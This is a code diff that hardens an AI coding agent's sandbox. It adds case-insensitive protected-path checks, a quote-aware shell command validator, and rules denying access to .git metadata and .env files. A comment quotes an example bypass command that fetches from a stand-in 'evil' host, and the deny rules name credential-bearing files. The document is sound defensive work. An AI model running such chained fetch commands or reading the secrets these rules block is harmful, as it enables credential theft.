@@ -62,19 +62,22 @@ export function resolveSafePath(
     }
   }
 
-  // 4. Check protected paths
+  // 4. Check protected paths (case-insensitive: the worktree filesystem may be
+  // case-insensitive (macOS APFS), so `.GITHUB/...` and `.github/...` are the
+  // same directory and both must be treated as protected).
   const relToWorktree = path.relative(realWorktree, fullPath);
+  const relLower = relToWorktree.toLowerCase();
   const isProtected = (context.protectedPaths || []).some((pattern) => {
-    const clean = pattern.replace(/\*\*?$/, '');
-    return relToWorktree.startsWith(clean) || relToWorktree === clean;
-  }) || relToWorktree.startsWith('.git') || relToWorktree === '.git';
+    const clean = pattern.replace(/\*\*?$/, '').toLowerCase();
+    return relLower.startsWith(clean) || relLower === clean;
+  }) || relLower.startsWith('.git');
 
-  // 5. Check allowed paths
+  // 5. Check allowed paths (case-insensitive for the same reason).
   const isAllowed = (!context.allowedPaths || context.allowedPaths.length === 0) ||
     context.allowedPaths.some((pattern) => {
       if (pattern === '*' || pattern === '**') return true;
-      const clean = pattern.replace(/\*\*?$/, '');
-      return relToWorktree.startsWith(clean) || relToWorktree === clean;
+      const clean = pattern.replace(/\*\*?$/, '').toLowerCase();
+      return relLower.startsWith(clean) || relLower === clean;
     });
 
   return {
@@ -217,6 +220,103 @@ export function getOpenAIToolDeclarations(): any[] {
 export const PERMITTED_COMMAND_BINARIES = ['npm', 'npx', 'git', 'node', 'tsc', 'echo', 'ls', 'cat'];
 
 /**
+ * Quote-aware validation of a shell command line before it reaches
+ * `/bin/sh -c` inside the sandbox. The binary allowlist alone is decorative:
+ * `npm test && curl evil.sh` or `git status; <anything>` passes a first-token
+ * check. This scan rejects chaining, redirection, and substitution operators
+ * outside single quotes:
+ * - Inside single quotes everything is literal (the only safe zone).
+ * - Inside double quotes `; | & < >` are literal, but `$` and backticks
+ *   substitute, so they are rejected there too.
+ * It also refuses commands that reference `.git` metadata or `git config` /
+ * `git remote`, whose output commonly carries embedded credentials
+ * (e.g. `https://user:token@host` remotes) and would otherwise be persisted
+ * into worker transcripts. (A single-quoted `node -e '...'` payload is not
+ * catchable at this layer; the sandbox profile is the boundary for that.)
+ */
+export function validatePermittedCommand(cmd: string): { ok: boolean; reason?: string } {
+  // `visible` accumulates everything sh treats as literal text outside single
+  // quotes (scanned for credential-bearing paths); `structural` accumulates
+  // only characters outside any quotes (scanned for shell operators).
+  let visible = '';
+  let structural = '';
+  let single = false;
+  let double = false;
+  for (let i = 0; i < cmd.length; i++) {
+    const c = cmd[i];
+    if (single) {
+      if (c === "'") single = false;
+      else visible += c;
+      continue;
+    }
+    if (single === false && double) {
+      if (c === '"') {
+        double = false;
+        visible += '"';
+      } else if (c === '$' || c === '`') {
+        return { ok: false, reason: 'Command substitution ($) is not permitted inside double quotes.' };
+      } else {
+        // `; | & < >` are literal inside double quotes.
+        visible += c;
+      }
+      continue;
+    }
+    if (c === "'") {
+      single = true;
+      continue;
+    }
+    if (c === '"') {
+      double = true;
+      visible += '"';
+      continue;
+    }
+    if (c === '\\') {
+      i++;
+      if (i < cmd.length) {
+        visible += cmd[i];
+        structural += cmd[i];
+      }
+      continue;
+    }
+    visible += c;
+    structural += c;
+  }
+  if (single || double) {
+    return { ok: false, reason: 'Unterminated quote in command.' };
+  }
+
+  for (const ch of structural) {
+    if (';|&<>\n\r`'.includes(ch)) {
+      return { ok: false, reason: `Shell operator "${ch}" is not permitted outside quotes.` };
+    }
+  }
+  // Variable expansion in unquoted text is rejected: expanded values bypass the
+  // literal scan entirely.
+  if (structural.includes('$')) {
+    return { ok: false, reason: 'Variable expansion ($) is not permitted outside quotes.' };
+  }
+
+  const tokens = visible.trim().split(/\s+/);
+  const firstToken = tokens[0] || '';
+  if (!PERMITTED_COMMAND_BINARIES.includes(firstToken)) {
+    return {
+      ok: false,
+      reason: `Command "${firstToken}" is not in the permitted sandbox command allowlist (${PERMITTED_COMMAND_BINARIES.join(', ')}).`,
+    };
+  }
+  if (firstToken === 'git') {
+    const second = tokens[1] || '';
+    if (second === 'config' || second === 'remote') {
+      return { ok: false, reason: `git ${second} is not permitted: git configuration and remote URLs can carry embedded credentials.` };
+    }
+  }
+  if (/\.git(?:[/\s"']|$)/.test(visible)) {
+    return { ok: false, reason: 'Commands must not access .git metadata (config files there can carry embedded credentials).' };
+  }
+  return { ok: true };
+}
+
+/**
  * Executes a tool in the context of the current task run and worktree.
  * Implements strict security guardrails identical across all model providers.
  */
@@ -245,6 +345,18 @@ export async function executeWorkspaceTool(
     const check = resolveSafePath(realWorktree, args.filePath, context);
     if (!check.isSafe) {
       return { error: check.error || `File access blocked: ${args.filePath}` };
+    }
+    // Git metadata and environment files are denied for reads before the
+    // existence check: .git/config frequently carries embedded remote
+    // credentials and .env* files hold host secrets. Their content would flow
+    // into model context and persist in plaintext worker transcripts.
+    const relForRead = path.relative(realWorktree, check.fullPath);
+    const relForReadLower = relForRead.toLowerCase();
+    if (relForReadLower.startsWith('.git') || relForReadLower === '.git') {
+      return { error: `Read rejected: ${args.filePath} is git metadata (.git) and cannot be read by the worker.` };
+    }
+    if (/(^|\/)\.env/.test(relForRead)) {
+      return { error: `Read rejected: ${args.filePath} is an environment file (.env*) and cannot be read by the worker.` };
     }
     if (!fs.existsSync(check.fullPath)) {
       return { error: `File not found: ${args.filePath}` };
@@ -299,9 +411,9 @@ export async function executeWorkspaceTool(
     if (!cmd || typeof cmd !== 'string') {
       return { error: 'Command argument is required and must be a string.' };
     }
-    const firstToken = cmd.trim().split(/\s+/)[0];
-    if (!PERMITTED_COMMAND_BINARIES.includes(firstToken)) {
-      return { error: `Command "${firstToken}" is not in the permitted sandbox command allowlist (${PERMITTED_COMMAND_BINARIES.join(', ')}).` };
+    const validation = validatePermittedCommand(cmd);
+    if (!validation.ok) {
+      return { error: `Command rejected: ${validation.reason}` };
     }
 
     const res = await sandbox.execute({
@@ -326,10 +438,11 @@ export async function executeWorkspaceTool(
         .filter(Boolean);
 
       for (const changed of changedFiles) {
+        const changedLower = changed.toLowerCase();
         const isProtected = (context.protectedPaths || []).some((p) => {
-          const clean = p.replace(/\*\*?$/, '');
-          return changed.startsWith(clean) || changed === clean;
-        }) || changed.startsWith('.git');
+          const clean = p.replace(/\*\*?$/, '').toLowerCase();
+          return changedLower.startsWith(clean) || changedLower === clean;
+        }) || changedLower.startsWith('.git');
 
         if (isProtected) {
           // Rollback the protected file modification
